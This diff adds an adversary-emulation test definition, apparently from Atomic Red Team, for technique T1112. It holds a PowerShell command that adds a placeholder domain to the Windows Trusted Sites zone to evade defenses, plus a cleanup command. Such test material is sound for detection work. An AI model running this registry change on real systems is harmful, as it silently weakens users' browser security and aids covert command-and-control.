@@ -1,0 +1,30 @@
+{
+    "name": "Add domain to Trusted sites Zone",
+    "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365. Upon execution, details of the new registry entries will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.  https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n",
+        "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1112",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Modify Registry",
+    "source": "ART",
+    "uuid": "cf447677-5a4e-4937-a82c-e47d254afd57",
+    "arguments": {
+        "bad_domain": {
+            "description": "Domain to add to trusted site zone",
+            "type": "string",
+            "default": "bad-domain.com"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
